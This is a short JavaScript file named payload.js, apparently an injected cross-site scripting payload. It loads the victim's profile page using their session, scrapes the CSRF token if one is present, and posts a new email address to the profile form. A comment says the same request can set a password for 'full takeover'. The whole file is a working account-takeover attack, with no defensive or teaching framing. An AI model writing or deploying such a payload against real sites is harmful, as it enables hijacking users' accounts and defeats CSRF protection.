// payload.js
(async () => {
  const page = await fetch('/profile', { credentials: 'same-origin' }).then(r => r.text());
  const m = page.match(/name="csrf_token" value="([^"]+)"/);   // token if CSRF protection exists
  const body = new URLSearchParams();
  body.set('email', 'you@got.got');                  // or set('password', '...') for full takeover
  if (m) body.set('csrf_token', m[1]);
  await fetch('/profile', {
    method: 'POST',
    credentials: 'same-origin',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString()
  });
})();
